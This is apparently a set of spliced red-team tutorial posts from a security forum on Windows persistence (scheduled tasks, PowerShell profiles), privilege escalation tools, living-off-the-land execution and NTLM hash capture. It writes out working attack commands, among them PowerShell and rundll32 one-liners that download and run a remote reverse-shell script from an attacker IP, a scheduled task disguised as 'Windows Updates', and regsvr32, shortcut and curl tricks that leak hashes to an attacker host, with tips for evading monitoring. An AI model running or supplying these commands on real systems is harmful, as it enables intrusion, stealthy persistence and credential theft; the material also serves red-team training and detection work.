<p><strong>Scheduled Tasks</strong></p>
<p>Another great method to gain Persistence on the Target Machine it’s great since this is another method that does not require any High Privileges such as Administrator or SYSTEM. You can work with a User permission scheduled task an still have Persistence, these are easy to work with but the majority would like to have Persistence as an Administrator on the System but let’s create a quick show on how to keep our Access using a Scheduled Task.</p>
<p>The great thing about this is you can have the Task execute commands or executables whichever you prefer in this occasion I will use a Binary which will call my Payload in PowerShell to keep Myself in Memory as well.</p>
<p>First I will need to Drop my Binary onto the System, use any method here that you are more familiar with usually C2’s can help or many of the LOLBINS available to execute this, I will simply use PowerShell <strong>Invoke-WebRequest.</strong></p>
<p>To create a task we use the following command:</p>
<pre><code class="lang-auto">schtasks /create /sc minute /mo 1 /tn "Windows Updates" /tr "PATH"
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ce199d9c95589897ce1d0d6b1f3fa9cfd9d2a32.png" alt="" data-base62-sha1="k6ic0HMbFSwJdtdiPkUCIeAtjGy" width="644" height="212"></p>
<p>I verify my task named Updater and I can tell it was successfully created to run every 1 Minute. I will go back to my Attacker Box and start a listener on the Port that I know my Payload will connect back to.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif" data-download-href="/uploads/short-url/qkM1NWkaz72Fbaru6bHAFCs1JC8.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_690x275.gif" alt="" data-base62-sha1="qkM1NWkaz72Fbaru6bHAFCs1JC8" width="690" height="275" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_690x275.gif, https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/b891b4d7bb54c22655928dd011852904b5231a28.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b891b4d7bb54c22655928dd011852904b5231a28_2_10x10.png"></a></div><p></p>
<p>And that easy a Persistence Shell with User Privileges by creating a simple scheduled task running every minute to call our Payload and Connect to our Specified Port (Running in Memory as well as this C# Binary calls PowerShell and uses and Obfuscated Payload to do all this, no need to do this as I am only teaching Basics).</p>
<p><strong>PowerShell Profiles</strong></p>
<p>PowerShell Profile is a PowerShell script which you can customize to your environment and add session specific elements to every PowerShell session that you Start.</p>
<p>Its a script that runs when PowerShell starts. You can use profiles as a logon script to customize the environment. You can add Commands, Functions, Aliases, Modules, etc.</p>
<p>PowerShell supports several profile files. Also, PowerShell host programs can support their own host-specific profiles.</p>
<p>A few Samples:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a.png" data-download-href="/uploads/short-url/rI101xlKAxG9LxIvBaUISC1cLd8.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a.png" alt="" data-base62-sha1="rI101xlKAxG9LxIvBaUISC1cLd8" width="690" height="205" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c23472e787cf2350c481e5b33d0565fba2ec0b5a_2_10x10.png"></a></div><p></p>
<p>The PowerShell profile script is stored in the folder <strong>“WindowsPowerShel”</strong> which is by default is hidden from the user. If a payload has been dropped into disk the “ <strong>Start-Process</strong> ” cmdlet can be used to point to the location of the Executable. The “Test-Path” determines if a profile exists for the current user. If the profile doesn’t exist the Command “ <strong>New-Item -Path $Profile -Type File -Force</strong> ” will create a profile for the current users and the “ <strong>Out-File</strong> ” will rewrite the profile.</p>
<p>First let’s create a Profile:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49.png" data-download-href="/uploads/short-url/yTpWLeQFR7sfl3FKbkFDeasbOCB.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49.png" alt="" data-base62-sha1="yTpWLeQFR7sfl3FKbkFDeasbOCB" width="690" height="245" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f48da1c555eecfd035903f6da780f5e0ac40ee49_2_10x10.png"></a></div><p></p>
<p>Then I will add the command I want to be executed when a New PowerShell Session is initiated.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca.png" data-download-href="/uploads/short-url/7Pu6k4FZEXxdwP4yM3eRw7c5mtQ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca.png" alt="" data-base62-sha1="7Pu6k4FZEXxdwP4yM3eRw7c5mtQ" width="690" height="102" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/36e11edd8b2ba22eb5f60a8ce8eae945d7baa1ca_2_10x10.png"></a></div><p></p>
<p>Now every New PowerShell will run my Executable Command and connect back to my Attacking Machine.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif" data-download-href="/uploads/short-url/iiInYtB1k2yJsvwHdmzCP2uUG3j.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_690x383.gif" alt="" data-base62-sha1="iiInYtB1k2yJsvwHdmzCP2uUG3j" width="690" height="383" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_690x383.gif, https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8044bced7d01ccf6a6af5a5b9ae546ec5f9e5415_2_10x10.png"></a></div><p></p>

<p>These are just a few demonstrations that I wanted to share they are simple and very easy to follow, If you would love to go more into Detail please do check out the MITRE FrameWork as it’s a great guide to understand and check out various techniques used by APT’s.</p>

<p>In today’s Episode of Red-Teaming we will talk about Privilege Escalation a valuable Technique when trying to gain higher privileges on a machine, we want to achieve this Goal because we want UNRESTRICTED access onto the machine we are targeting. In this part the APT is trying to gain higher privileges on the Machine</p>
<p>There have been various great talks and blogs about this part of Red-Teaming they are well documented, and so many incredible tools that can be used to achieve this Goal. I will work with a few well known tools. Some of these are written for our famous PowerShell, others in C# and then with Python.</p>
<p><strong>1.- Files</strong></p>
<p>Let’s not go too far, by experience or CTF’s sometimes the passwords are in Plain Sight no need to use fancy exploitation methods or Capture Hashes and none of that sort. Why not just search a file named <strong>Passwords.xlsx.</strong> Yes these famous files do exist, they can be on the machine, on a share or even right on the Desktop. And let’s not forget these can be Word Documents, Text Files, or anything that can hold passwords.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png" data-download-href="/uploads/short-url/s4oYfTlijlKSTWZ6ykFC50IKKbF.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_690x355.png" alt="" data-base62-sha1="s4oYfTlijlKSTWZ6ykFC50IKKbF" width="690" height="355" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_690x355.png, https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c4bc47a2b92769410206f64eb53a814e4134e81b_2_10x10.png"></a></div><p></p>
<p>But of course unless you have a Cheat Sheet with all these fancy commands to search for these files, why not use an already created awesome tool. That can search for these files in a fast manner and even faster if it’s an SSD.</p>
<p><strong>2.- Tools</strong></p>
<p><em>Sauron Eye</em></p>
<p>First awesome tool in our list in its Gihub Repo it is said:</p>
<p>SauronEye is a search tool built to aid red teams in finding files containing specific keywords.</p>
<p><strong>Features</strong> :</p>
<ul>
<li>Search multiple (network) drives</li>
<li>Search contents of files</li>
<li>Search contents of Microsoft Office files (.doc, .docx, .xls, .xlsx)</li>
<li>Find VBA macros in old 2003 .xls and .doc files</li>
<li>Search multiple drives multi-threaded for increased performance</li>
<li>Supports regular expressions in search keywords</li>
<li>Compatible with Cobalt Strike’s execute-assembly</li>
</ul>
<p>It’s also quite fast, can do 50k files, totaling 1,3 TB on a network drive in under a minute (with realistic file filters). Searches a C:\ (on a cheap SATA SSD) in about 15 seconds.</p>
<p>Let’s work with this tool we have our shell and we will need to upload the Binary onto the machine (Yes!! Poor Opsec, but it’s just a Demo).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3435fcdc4e27e5c2bd673d7acb497918b264fe67.png" alt="" data-base62-sha1="7rSuN8VbltN3A6ho9wheL2HVyHd" width="628" height="302"></p>
<p>Let’s search for these password files</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif" data-download-href="/uploads/short-url/pDU3nNzDoxR5QMAKDoAy5Qi0DGM.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_690x367.gif" alt="" data-base62-sha1="pDU3nNzDoxR5QMAKDoAy5Qi0DGM" width="690" height="367" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_690x367.gif, https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b3b91b1656e9c3b64a94d78d57827f67cb9b8ed8_2_10x10.png"></a></div><p></p>
<p>Oh yes, in just seconds it crawled the entire C:\ directory and its sub-directories and managed to found plenty of files, one is our Password.txt file that I moved to the Documents folder, what and amazing Tool. With that password we can use tools such as CrackMapExec to capture shells as Administrators</p>
<p><em>SharpUp</em></p>
<p>Another amazing tool.</p>
<p>SharpUp is a C# port of various <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" rel="noopener nofollow ugc">PowerUp</a> functionality. Currently, only the most common checks have been ported; no weaponize functions have yet been implemented.</p>
<p>This tool comes in an awesome package named GhostPack highly active and frequently updated to keep up with the .NET Framework incompatibilities.</p>
<p>The thought about this tool is that we can also use it’s PowerShell Brother in case .NET isn’t available or the proper version for it to run. If by any chance you downloaded the incorrect one but let’s focus on the C# one.</p>
<p>The syntax for this one is very simple:</p>
<pre><code class="lang-auto">Sharpup.exe audit
</code></pre>
<p>And it finds 2 methods to Privesc which with a little more research we can actually see that its very simple since our User is already an Admin but the Shell isn’t running with High Privileges</p>
<p><em>Don’t forget to use the PowerShell version if you can’t get the C# to work</em></p>
<p>¯_(ツ)_/¯</p>

<p><em>Responder</em></p>
<p>Aaaah the amazing tool for Active Directories and almost everything Windows. I won’t explain into detail about Responder since there is so much out there about this tool. But TL;DR is that Responder…… well Responds to LLLMNR, NBT-NS requests, by poisoning these requests when a user misspells or tries to access an non-existent Share responder will say “Yeah it’s Me!!”and with that it can Capture the NTLMv2 hashes.</p>
<p>Its very easy to use just have responder running on the local area network and wait for requests, Of Course recommended by the Creator a good Pentester always recons first using  “-A”  no need to respond to EVERY request just a few target machines, try to be as stealthy as you can.</p>
<p>[But were not trying to be stealthy here we want Admin!!! So let’s respond!!!]</p>

<p><strong>3.- Exploitation</strong></p>
<p>Alright here is an interesting one and sometimes very difficult to work with, you Test and you Test , you are sure the exploit works in your Environment but when you use it live. Uh Oh the System Crashed, it didn’t work??!</p>
<p>Or just nothing happens. Even if this happens let’s imagine it all went fine!! Let me show the most current Example going on in the World right now on a Local privilege Escalation method.</p>
<p><em>WesNg</em></p>
<p>Another amazing tool I stumbled upon <em>Thank You Twitter.</em> The creator loved the Windows-Exploit-Suggester by GDS Security but unfortunately it hasn’t been updated since 2017 so taking matters into his own hands BOOM, WESNG was born and has been using the latest information for exploits. Its very easy to use, on your regular shell grab the sysinfo.exe information save it onto a txt file and run the script with file as a parameter.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288.png" data-download-href="/uploads/short-url/5UHnducTZvwR7eu6SJl0MK6jBRm.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_465x500.png" alt="" data-base62-sha1="5UHnducTZvwR7eu6SJl0MK6jBRm" width="465" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_465x500.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_697x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/2973a8b1e0cad4f624f367cb2a15a8009216c288_2_10x10.png"></a></div><p></p>
<p>Then we use the following syntax</p>
<pre><code class="lang-auto">wes.py SYSINFO.TXT
</code></pre>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png" data-download-href="/uploads/short-url/1linCeA4wHCFLXfTTBrOiBaWj6E.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_690x256.png" alt="" data-base62-sha1="1linCeA4wHCFLXfTTBrOiBaWj6E" width="690" height="256" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_690x256.png, https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/0/096a75109b1902ea27643761bc552626db0f0b98.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/096a75109b1902ea27643761bc552626db0f0b98_2_10x10.png"></a></div><p></p>
<p>SMBGhost</p>
<p>Aaah the talk of the moment, [I think…] a new vulnerability that grants us SYSTEM access this is the most recent I can find and will show you how its being exploited. Newest Exploit and it looks very simple to attack.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif" data-download-href="/uploads/short-url/nJEtfZWi4bTK5iOdHQwWQGww7mN.gif?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_689x499.gif" alt="" data-base62-sha1="nJEtfZWi4bTK5iOdHQwWQGww7mN" width="689" height="499" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_689x499.gif, https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61.gif 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/a/a65b1d4c9d7fbf089543b19d33c4ee23abbdbe61_2_10x10.png"></a></div><p></p>
<p>But how do we search for this vulnerability?, well there are a few methods we can check it by using the SMBGhost Scanner script by ollypwn.</p>
<aside class="onebox allowlistedgeneric">

<p>Uh Oh not here.</p>
<p>As you noticed we seen various methods for gaining higher privileges we used Offensive Tool to do the recon and we also used in-house commands to check our environment as well to find vulnerable OS we did the easy thing in just searching for stored passwords in clear text if you been pentesting or just playing with CTF you will notice the phrase “Low hanging Fruit” And yeah, don’t break your head sometimes the answer is very simple (Believe me).</p>
<p>Happy Hacking and hope you love a little more Red- Team.</p>

          <title>Execution (LOLBAS)</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1>Execution</h1>
<p>In my previous post I talked about capturing hashes using a variety of different methods if you noticed these methods were utilizing LOLBAS also know as <em><strong>Living Off The Land Binaries and Scripts (and also Libraries)</strong></em> but what are these Executable that I utilized???. They are Windows Trusted Binaries that come installed into the System already, by living off the Land we utilize trusted binaries from Windows to execute our Malicious Binaries, in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a> I was explained why these are utilized by APT (Advanced Persistent Threats) some of the reasons given were:</p>
<ul>
<li>Avoid creating new processes/network connections</li>
<li>Avoid creating anomalous parent/child relationships</li>
<li>Avoid creating/modifying files/registry entries</li>
<li>Avoid creating memory anomalies</li>
<li>Avoid leaving evidence in log files</li>
</ul>
<p>Why is this good?, well let me show you an Example if we execute a malicious binary or command that calls back to our attacking machine what does the Blue Team see??, Well if we use some of the tools available (SysInternals) this is a great way to view what is going on.</p>
<p>Let’s catch a Shell using a PowerShell Script.</p>
<pre><code class="lang-auto">powershell.exe -W 1 -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.15:8000/Connect-BDTcp.ps1');
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5547d2440777145e5788b06f5726baeedab5824f.png" alt="" data-base62-sha1="caqsC5CFWSlJJWHb3YFoh6BaoTt" width="" height=""></p>
<p>Shell</p>
<p>I used this command because I am telling power shell that I want the Window-Style as Hidden so when executed it is not shown (“Obviously!!”) on the Victim machine.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/019b1695cd98d5829a6e1c5b1fb32bc315416fcf.png" alt="" data-base62-sha1="ecKErrx4YDloNZ7IS4vh8isG4L" width="" height=""></p>
<p>No Window!!</p>
<p>But here comes in Sysinternals, Process Explorer what can we see with this Marvelous Tool.</p>
<p>Uh Oh, nothing good an obvious PowerShell execution, with a Network Connection being established.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e7dc45208463b02d45f1cd1f2733d717c6bd2411.png" alt="" data-base62-sha1="x58dLucoIXO8NSxramjRdpsj0Cl" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f7ef086c7411b9e1ca9f83b0ef77b44683846116.png" alt="" data-base62-sha1="znk3LRkfeB2vZPKqlhyb9TFVG3c" width="" height=""></p>
<p>Not good this will get caught Immediately, Poor Opsec and very obvious to a tool for monitoring, we have to make this a little more difficult to catch, here come’s LOLBAS.</p>
<p>For the sake of Demonstration I will use RunDLL to call the same PowerShell Script and Execute. In the following example it combines with JavaScript so it can execute powershell and call the script remotely usually rundll32 will execute DLL files but this can be combined to execute commands as well.</p>
<pre><code class="lang-auto">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")
</code></pre>
<p>Here we go, a little better since rundll32 is a legit process sometimes it’s nothing to worry about. But…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cc1d260bff3f54fde38d827433065ba7cc4f411a.png" alt="" data-base62-sha1="t7FQZ5R7FaWfSxBUgIxCD3Ich0m" width="" height=""></p>
<p>What is this Command Line Syntax being used!!!.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/72d95631f248d6ae7d7e5edaf615392794ca4792.png" alt="" data-base62-sha1="go04y0mEDqZbvVu7UFBJfRTkQX8" width="" height=""></p>
<p>Yes we manage to avoid the creation of a Child Process, and it doesn’t show a Network Connection.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1972d27fe8b243678be3062d39c488d15f2556fe.png" alt="" data-base62-sha1="3D7Wqj5ZFbUwBGLLHM0FoRJ47hQ" width="" height=""></p>
<p>But we have that Syntax that can give us away, at least you get the idea we hid ourselves properly this time by using a legitimate Windows binary to execute our malicious payload.</p>
<p>OK let’s continue, now that we know a little into why these are used let’s show another example on what they can be used for as well, let’s imagine we have initial access in one of our engagements but this environment is well aware of what is going on with hacking, blacklisted known extensions and it’s very restricted on what can be executed our primary suspects here are “EXE, DLL, HTA, SCR” these files are known for executing malicious malware so here LOLBAS enters again, in this example we have access in a Developer machine, Visual Studio is installed (You know where this is going) and MSBuild is available.</p>
<p><em><strong>MSbuild: Microsoft Build Engine is a software build platform used by Visual Studio. it takes XML formatted project files. Adversaries can use MSBuild to proxy execution of code through a trusted windows utility. The inline task allows for C# code to be inserted in the XML project to compile and execute the arbitrary code.</strong></em></p>
<p>In this example we hold a small shell and we are trying to upgrade into our C2, and we only have MSBuild available to execute we upload our XML payload to the victim machine and utilize MSBuild to execute.</p>
<p>          <p><a href="https://vimeo.com/432322419">https://vimeo.com/432322419</a></p>
<br>
MSBuild Example</p>
<p>Great we got a shell proxy executing with MSBuild using an XML file with C# code inserted so it may compile and execute.</p>
<p>Finally our last example, we know how to execute files, evade logs, and the creation of child processes and the use of trusted binaries to execute our malware. Now let me demonstrate an example on UAC Bypass and Privesc with one of these trusted binaries</p>
<p>I enumerated the Machine and it contains a privilege escalation vulnerability named “Always Install Elevated” (more info <a href="https://dmcxblue.gitbook.io/red-team-notes/privesc/unquoted-service-path" rel="noopener nofollow ugc">here</a>). I upload an MSI Malware and try to execute but what happens??.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2357a0b6c18e4c13b6e0da40baa5d2009d63f774.png" alt="" data-base62-sha1="52Es5ReMWFAduG2xGrNCiKXZ7Za" width="" height=""></p>
<p>No Shell</p>
<p>But why?, I got back to the Machine and I see this.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/524fd84ce91be874a78a984a90d9b0b17d98d1d4.png" alt="" data-base62-sha1="bKadBTIBcODf9aVNH0u9DOqV8oc" width="" height=""></p>
<p>UAC</p>
<p>Good old UAC, a feature implemented in Windows Vista, and Windows Server 2008, a more relaxed version on 7 and newer. Here come’s windows signed binaries again with these we can Bypass UAC, usually these binaries run with more elevated permissions or because Windows Trusts these to be executed (Now they are more monitored). But let’s see the Bypass in action.</p>
<p>          <p><a href="https://vimeo.com/432336491">https://vimeo.com/432336491</a></p>
</p>
<p>We worked with a few well known examples with windows signed binaries they are helpful for Executions and Bypasses these are few examples on what can be done with these Binaries you are more than welcome to review them <a href="https://lolbas-project.github.io/#" rel="noopener nofollow ugc">here</a> and in my <a href="https://dmcxblue.gitbook.io/red-team-notes/execution" rel="noopener nofollow ugc">Gitbook</a>. It will go more into detail and have various examples on what other things can be done.</p>

          <title>Capturing Hashes</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>A little from my Blog that I wanted to share here as well.</p>
<p><a href="https://dmcxblue.net" rel="noopener nofollow ugc"><em>DMCXBLUE</em></a></p>
<p>These examples will be used from a Reverse Shell, as not always we have the great GUI to use when we are in an engagement or simply it’s just not available because of X reason. I will try me best to work with this situation as I as well would love to be capable of running many techniques from just a simple Shell, [ <em>don’t know why but like it more that way</em> ].</p>
<h4>Responder</h4>
<p>In the first example I will use an awesome tool called “ <em><strong>Responder</strong></em> ” a great tool used for Poisoning LLMNR and NBT-NS responses, this cool works great when a user mistakenly mistypes a network share, the reason it works is because when Microsoft can’t find the Network name (DNS) it will fall back to LLMNR and NBT-NS from here responder, Responds to the connection telling the user that “Yes I am [Insert Name Here] and will capture the Ntlmv2 hash used for Authentication here is a sample on how to capture it with your Shell.</p>
<p>Use the “dir” command and try to list an UN-existing share from here Responder will start it’s magic in responding to that UN-existing share.</p>
<pre><code class="lang-auto">dir \\NotHere\C$
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f0b7fce90d92c96f54a5faa79d91eec189ab184b.png" alt="" data-base62-sha1="yluMGqOr4A8tV5t1FBgRhyZ0neX" width="660" height="472"></p>
<p>Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/ffc806197eeac804d08291aa4421b676671a03b2.png" alt="" data-base62-sha1="AuKiQIoaSEWBb9YyWQTbsah0AZc" width="690" height="245"></p>
<h4>SMBServer.py</h4>
<p>A great tool from Impacket here we can create a fast SMB Server to share files and to Exfiltrate any Loot that we may find on the Network but we are focused in grabbing hashes, so how would this work?, Easy we setup the SMB Server and then we simply connect to it to capture the Hash.</p>
<p>In this example we also need to use the IP Addr of the attacking machine with it’s Share Name that we are trying to access.</p>
<pre><code class="lang-auto">dir \\&lt;IP ADDR&gt;\Fake-SMB
</code></pre>
<p>The user will receive an error like this if they ever try to access the Share you have to make sure to add SMB2Support for Compatibility Issues.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6366d92646ea0f60d7a63ab752f8b20c3f048dd0.png" alt="" data-base62-sha1="eblCuMYbGGdF9Fvaz4h2wcylYVq" width="690" height="241"></p>
<p>Error Message</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2a6f8efe671ddd15bfb91a426620896a0e73ad0c.png" alt="" data-base62-sha1="63p4986lQd5a7kntEFpMd5yNC56" width="657" height="500"></p>
<h4>Regsvr32.exe</h4>
<p>With this tool we can try and call an unexisting file from our Attacking Machine it will try to communicate and from here as well we will capture the Ntlmv2 Hash.</p>
<pre><code class="lang-auto">regsvr32.exe /s /u /i://10.0.2.15/@NotExist scrobj.dll
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bcb02d3eafed7ecc9be7b09ae3f3e9d0d8c5ff42.png" alt="" data-base62-sha1="qVddIVjlNcgmDWij4KXcslEk6Vs" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ea4df6fbbfd2ec0846e3676c780f8e854882cf5.gif" alt="" data-base62-sha1="klT2qtxNNZf93v3h5xGASzPmJnf" width="690" height="239"></p>
<h4>ShortCut Links</h4>
<p>What about Shortcut Links, make our target thing that they are trying to visit a website but they actually pinged our Machine??, Well since we have a powershell Shell we can create a simple LNK File to do this. We can use the following:</p>
<pre><code class="lang-auto">$WshShell = New-Object -comObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("hash.url")
$shortcut.TargetPath = "file://10.0.2.15/@NOTHERE"
$shortcut.Save()
</code></pre>
<p>And finally we can just call it from Powershell or wait for Our Target to execute it, we might want to do some SE here and make it like we replaced an LNK of there own.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/64d82f1722ced69c35eb2586b9fcb1ea4bead629.png" alt="" data-base62-sha1="eo6UYGWIcZJeZHcnDgEMhLgdAeZ" width="" height=""></p>

<h4>Curl</h4>
<p>Yes as mentioned here, we can use Curl to capture NTLM hashes as well you mostly have to wonder about applications that make network connections as Curl is now integrated in Windows CMD and PowerShell it’s as simple as typing:</p>
<pre><code class="lang-auto">curl \\10.0.2.15\NOTHERE.txt
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/44b4aa5f3244cd723fa546be1faca4e2158f0eab.png" alt="" data-base62-sha1="9NNxBINAQP1Fz8AiKQRylp8Cv7d" width="" height=""></p>
<p>Responder Ready:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b34ac88d498e23648e5d915b5e71fdd5ceffd3c9.png" alt="" data-base62-sha1="pA5GM2TWm4nnp6RIs4Je3ixoICl" width="" height=""></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/573aa9d5303ff4dd842ca5fdab45f4770a125ab3.gif" alt="" data-base62-sha1="crFdZBw4CIagUWeYmrNuC7AtbiP" width="690" height="239"></p>
<p>These are just a few techniques, methods which we can utilize from our trusty old ncat Shell and grab some NTLMv2 hashes and the good thing is that we don’t even need to Escalate Privileges we can just leave these files and wait for an Administrator to click them [ <em>It sometimes happens!</em> ] and we can capture those hashes as well from here we know how to proceed now we can use any Password Cracker [John, Hashcat, etc] To crack these hashes their are more techniques that are very useful for even catching a Shell [NTLM Relay] but we won’t dive into that I just wanted to demonstrate a few techniques on how to capture some hashes be wary it can be as simple as <code>rundll32.exe \\10.0.2.15\NOTHERE.txt,entrypoint</code> . [Another technique not explained] but you get the idea these binaries have network connection’s not just to execute remote files or download but we can capture Hashes as well!.</p>

            <p>Hello Mates,</p>
